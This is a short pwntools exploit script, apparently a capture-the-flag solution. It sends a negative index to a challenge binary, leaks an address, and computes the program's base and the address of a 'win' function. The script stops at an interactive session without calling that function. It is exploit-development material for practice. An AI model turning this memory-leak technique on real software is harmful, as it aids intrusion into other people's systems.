#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  # context.terminal = ['tmux', 'splitw', '-h']  
  context.terminal = [
    'wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc'
  ]
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

win = elf.sym.win
print(f"win: {hex(win)}")
p.sendline(b'-32')

p.recvuntil(b'index: ')
leak = int(p.recvline()[:-1].strip(), 16)
print(f"Leak : {hex(leak)}")

elf.address = leak - 0x4030
print(f"base address: {hex(elf.address)}")
print(f"resolved win: {hex(elf.sym.win)}")

# pause()

p.interactive()

# NOTE:
#
